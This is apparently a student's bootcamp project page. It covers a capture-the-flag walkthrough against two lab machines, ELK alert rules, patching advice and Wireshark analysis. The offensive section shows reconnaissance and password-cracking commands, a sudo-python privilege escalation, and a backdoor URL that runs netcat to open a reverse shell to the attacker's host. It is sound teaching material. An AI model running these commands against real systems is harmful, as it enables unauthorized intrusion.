---
title: Final Project
layout: default
description: The final project from my Cybersecurity course demonstrates aspects of offensive security, defensive security, as well as some network analysis.
<!-- repository: https://github.com/lithrion/ELK-Stack-Project -->
---

# Final Project
The final project of the cybersecuirty boot camp that I took through UCSD extension consisted of three parts.
- [Offensive Security](#offensive-security)
- [Defensive Security](#defensive-security)
- [Network Analysis](#network-analysis)

## Overview
The defensive security part of the project involved setting up a few rules on an ELK stack using Kibana to detect suspicious activity. Then after completing the offensive portion of the project, we returned to the ELK stack to review the logs of the suspicious activity that occured.

The offensive security portion of the project was a capture the flag type activity where we exploited vulnerabilities on the machine that the ELK stack was monitoring.

The network analysis portion of the project was independent of the offensive/defensive sections, and involved analysis a PCAP file for suspicious activity.

## Network Topology

The image below shows the topology of the network that was used during this project. Target1 and Target2 were the focus of the offesnive security portion of the project. The defensive portion focused on the ELK server, which was observing Target 1 and Target2. The Capstone machine was part of another project, and the network anaylsis portion of the project was independnet of this network.
![Network Topology](/images/class-projects/final/topology.png)


## Offensive Security

The Offensive Security portion of the project was a capture the flag activity where the goal was to capture the flags on both Target1 and Target2.

### Target 1 - 192.168.1.110
**Objective:** Gain root access on the machine finding 4 Flags along the way.

#### Reconnasiance
A nmap scan of the target revealed a handful of open ports, including port 80 for http traffic.
`nmap -sV 192.168.1.110`
![nmap SCan](/images/class-projects/final/nmap.png)

Visiting 192.168.1.110 in a web browser revealed some general information about the company that the website was for, including some employee names and positions. Inspecting the source code of the website revealed the first flag inside one of the webpages.

Delving a little deeper into the structure of the website, running DirBuster revealed some addition files and directories. This included a login page, and well as indicating that the website was build using wordpress.

#### Enumerating Users

As the first step towards gaining login credentials, I used WPScan in order to enumerate usernames.
`wpscan --url http://192.168.1.110/wordpress --force`
Which came up with two results.

![WPScan Results](/images/class-projects/final/wpscan.png)

#### A Foothold

Another open port from the nmap scan back at the beginning was 22, or ssh. It turned out Michael had a terribly weak password, it was the same as his username. Which made for a pretty quick way to gain access to the machine without even requiring any additional tools.
`ssh Michael@192.168.1.110`

Once logged in, looking around a little found Flag2 inside the `/var/www` directory. Looking a little further found a useful config file, `wp-config.php` located at `/var/www/html/wordpress`

![WP Config](/images/class-projects/final/wpconfig.png)

Inside the configuration was were the credentials for a MySQL database.

#### mySQL Database
Inside the mySQL database using
`show databases;`
`show tables;`
Displayed the wordpress tables and then
` select * from wp_users;`
revealed both Michael and Steven's password hashes.

![hashes](/images/class-projects/final/hashes.png)

The database also contained Flag3.

#### John the ripper
By exporting the two hashes from the database into a text file, John the Ripper was able to crack one of the two hashes. This gave Steven's password, pink84.
`john hashes.txt`

![John the Ripper](/images/class-projects/final/john.png)

![John Results](/images/class-projects/final/john_results.png)

#### Privilege Escalation
After switching users to Steven, I checked his sudo access.
`sudo -l`

![sudo access](/images/class-projects/final/sudo.png)

and saw that he has sudo access for python. That's certainly an issue considering python can execute commands including things like creatinga new bash shell.

After writing a quick little privilege escalations script

![Privesc.py](/images/class-projects/final/privesc.png)

I ran that script as root
`sudo python privesc.py`
which created a new shell as root.

![root](/images/class-projects/final/root.png)

Flag4 was inside root's home directory, and was the final objective for Target1.

### Target 2 192.168.1.115
This goal on this machine was only to gain user access, although it did take a little more work to get there.

#### Reconassiance
This machine started off similarly with a nmap scan `nmap -sV 162.168.1.115` and then running DirBuster.

![DirBuster](/images/class-projects/final/dirbuster2.png)

This revealed the directory `192.168.1.115/vendor/PATH` which contained Flag1.

#### Mail PHP Remote Code Execution
For the next step, we were actually provided with a script for the exploit, but I did a little bit of research on it to see how it works.

In the PHP mailer being used, there are five paramaters used by the mail function. The `to`, `subject`, and `message` paramaters are required paramaters, and `additional headers` and `additional_parameters` are two optional paramaters. It's the 5th paramater, the option `additional_parameters` that's interesting for exploitation purposes.

By creating a mail message with a carefully crafted 5th parameter an aritrary file could be written onto the server. In this case it was used to write a file that enabled a php command injection attack.

First, netcat was used to start a listener. `nc -lnvp 4444` and then the php command injection was used to open a back door.
`192.198.1.115/backdoor.php?cmd=nc%20192.168.1.90%204444%20-e%20/bin/bash`

That connection immediately revealed Flag2

![Flag2](/images/class-projects/final/flag2.png)

Flag3 was located with a find command
`find /var/www -type f -iname 'flag*`

![flag3](/images/class-project/final/flag3.png)

as a png image, which was view in a web browser
`192.168.1.115/wordpress/wp-content/uploads/2018/11/flag3.png`

Which was the final flag of the activity.

#### Summary
##### Target 1
**Vulnerabilities:**
- Weak Password Policy
- Directory Transversal
- Insecure SSH
- Insecure Wordpress Config
- Improper Sudo Privileges

Weak passwords came up a couple times on this machine. Michael's password was guessable, and the password hashes found in the mySQL database were unsalted.

A good deal of the file structure for the webserver was unnecessairly visable.

While it wasn't needed for this exercise, the version of SSH on the target was outdated and has vulnerabilities associated with it.

The Wordpress configuration files that was accessed to gain the mySQL database credentials should not have been accessable on Michael's account.

Sudo was improperly configured for Steven's account, allowing sudo access to a program that should not have sudo access. This was ultimately how root access was obtained.

## Defensive Security

### Configuring Monitoring

The first step in the defensive portion of the project was to configure the ELK server to monitor some of the traffic and statistics from the two target machines.

#### CPU Usage Monitor
The first alert was set to monitor metricbeat and to trigger `when max() of system.process.cpu.total.pct all documents is above .05 for the last 5 minutes`
![CPU Usage Monitor](/images/class-project/final/cpu_usage.png)

#### HTTP Request Size Monitor
The next alert was monitor packetbeat and set to trigger `when count() over all documents is above 1000 for the last 5 minutes`
![HTTP Request Size Monitor](/images/class-project/final/HTTPRequest.jpg)

#### Excessive HTTP Errors
The third of the basic alerts for this activity tracked HTTP Errors. It monitored packetbeat and was set to trigger `when count() grouped over top 5 'http.response.status_code' is above 400 for the last 5 minutes`
![HTTP Errors](/images/class-project/final/HTTPErrors.jpg)

These three alerts were set up before the offensive portion of the project began to catch some of the suspicious activity that might occur during the offensive sections, such as failed login attempts while trying to brute force credentials.

### Hardening the Servers
In addition to the vulnerabilities that were used to exploit the machines in the penetration testing section, there were a handful of outdated services running on the target machines with known vulnerabilities.

#### Updating Apache
Both target machines were running Apache 2.4.10 which contained known vulnerabilities, including CVE-2017-3167

<img src="/images/class-projects/final/apache.png" alt="CVE-201703167" height="200%"/>

The vulnerability was patched in versions 2.2.33 and 2.4.26, and updating to the newest apache version mitigates the vulnerability. At the time of the project the latest version of apache was 2.4.46.
*Mitigation* `sudo apt install apache 2.4`

#### Updating OpenSSH
The target machines were running OpenSSH 6.7p1 which is vulnerable to CVE-2018-15919.
![CVE-2018-15919](/images/class-projects/final/openssh.png)
The vulnerability existed through versions 7.8, so updating to the latest version of OpenSSH would effectively mitigate the vulnerability. At the time of the project, the latest version was 8.3.
*Mitigation* `sudo apt install ssh 8.3`

#### Updating Samba
Another vulnerable service on the target machines was Samba. The machines were vulnerable to a code execution vulnerability through Samba, CVE-2017-7494.
![CVE-2017-7494](/images/class-projects/final/samba.png)
Like the other vulnerability, the solution was to update to a newer version where the vulnerability had been patched. In this case, version 4.12.
*Mitigation* `sudo apt install samba 4.12`

Alternatively, those updates could be done through ansible using a [YAML playbook](./updates.yml).

## Network Analysis

The network analysis portion of the project was done by using wireshark to analyze the network traffic contained within a PCAP file. This traffic was seperate from the previous portion of the project.

Overall the traffic in the PCAP contained 808 unique ip addresses from 3 subnets: `10.0.0.0/24`, `10.6.12.0/24`, and `172.16.4.0/24`

There was some beneign activity detected such as browsing web pages or watching youtube videos, as well as some suspicious activity. There were some instances of files being sent out of the subnet, and well as an instance of malware being sent to a machine.

### Web Browsing

A fair amount of traffic was detected between `166.62.111.64` (mysocalledchaos.com) and `172.16.4.205` (Rotterdam-PC.mind-hammer.net)
![Web Traffic](/images/class-project/final/web_traffic.png)
The user appears to have been browsing the website mysocalledchaos.com and also downloaded some files
![Downloads](/images/class-project/final/downloads.png)
On closer inspection those files did not raise any concerns.

### Watching YouTube

Some users were detected connecting to youtube over the TCP protocol.
![youtube TCP](/images/class-project/final/TCP.png)
and some connections using UDP were found as well.
![youtube UDP](/images/class-project/final/UDP.png)

### Malware Sent to a Machine on the Network (12.6.12.0/24)

There was suspicious traffic between `10.6.12.203` (LAPTOP-5WKHX9YG.frank-n-ted.com) and `205.185.125.104`. A file was downloaded to `10.6.12.203` called june.dll.
![june.dll](/images/class-project/final/june.png)
Scanning the file on virustotal.com revealed that it was a trojan.
![virustotal](/images/class-project/final/scan.png)

### Files sent out of the subnet (172.16.4.0/24)
An infected machine on the network `172.16.4.205` (Rotterdam-PC.mind-hammer.net) was detected sending a file to `185.243.115.84` (b5689023.green.mattingsolutions.co).
![exfiltration](/images/class-projects/final/exfiltration.png)
![exfiltration2](/images/class-projects/final/exfiltration2.png)
